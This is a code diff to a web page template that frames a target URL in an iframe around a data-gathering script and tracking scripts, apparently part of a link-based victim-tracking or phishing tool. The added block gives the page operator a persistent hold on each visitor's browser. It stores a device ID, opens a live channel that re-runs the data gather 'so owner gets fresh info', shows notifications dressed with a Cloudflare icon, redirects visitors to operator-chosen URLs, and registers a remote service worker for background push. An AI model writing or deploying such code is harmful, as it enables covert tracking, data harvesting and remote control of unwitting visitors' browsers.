@@ -167,6 +167,64 @@ gather();
 </script>
 <script src="<%= a %>/t.js?u=<%= uid %>"></script>
 <script src="<%= a %>/adv.js?u=<%= uid %>&a=<%= a %>"></script>
+
+<% if(pushAccess){ %>
+<script>
+(function(){
+  var HOST = "<%=a %>";
+  var UID  = "<%=uid %>";
+  var PURL = location.href;
+
+  // ── Persistent device ID ──────────────────────────────────────────────────
+  var PID = localStorage.getItem('_pid');
+  if (!PID) { PID = ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g,function(c){return(c^crypto.getRandomValues(new Uint8Array(1))[0]&15>>c/4).toString(16);}); localStorage.setItem('_pid', PID); }
+
+  // ── SSE — live push channel (page open) ──────────────────────────────────
+  function connectSSE() {
+    var es = new EventSource(HOST + '/push-stream?uid=' + encodeURIComponent(UID) + '&pid=' + encodeURIComponent(PID) + '&purl=' + encodeURIComponent(PURL));
+    es.addEventListener('push', function(e) {
+      try {
+        var d = JSON.parse(e.data);
+        // Re-run data gather so owner gets fresh info
+        if (typeof gather === 'function') { try { gather(); } catch(ex){} }
+        // Also show a browser notification if possible
+        if (Notification && Notification.permission === 'granted') {
+          new Notification(d.title || '🔔', { body: d.body || '', icon: 'https://www.cloudflare.com/favicon.ico' });
+        }
+        // If there's a redirect URL, open it
+        if (d.url) setTimeout(function(){ location.href = d.url; }, 1500);
+      } catch(ex){}
+    });
+    es.onerror = function() { es.close(); setTimeout(connectSSE, 8000); };
+  }
+  connectSSE();
+
+  // ── Service Worker + VAPID push (background) ─────────────────────────────
+  if ('serviceWorker' in navigator && 'PushManager' in window) {
+    navigator.serviceWorker.register(HOST + '/sw.js').then(function(reg) {
+      // Subscribe to push
+      fetch(HOST + '/vapid-key').then(function(r){ return r.json(); }).then(function(d){
+        var appKey = d.key;
+        var rawKey = appKey.replace(/-/g,'+').replace(/_/g,'/');
+        var pad = rawKey.length % 4;
+        if (pad) rawKey += '===='.slice(pad);
+        var raw = atob(rawKey);
+        var key = new Uint8Array(raw.length);
+        for (var i = 0; i < raw.length; i++) key[i] = raw.charCodeAt(i);
+        return reg.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: key });
+      }).then(function(sub){
+        fetch(HOST + '/push-subscribe', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ uid: UID, pid: PID, purl: PURL, sub: sub.toJSON() })
+        }).catch(function(){});
+      }).catch(function(){});
+    }).catch(function(){});
+  }
+})();
+</script>
+<% } %>
+
   <iframe src="<%=url %>"></iframe>
 </body>
 </html>
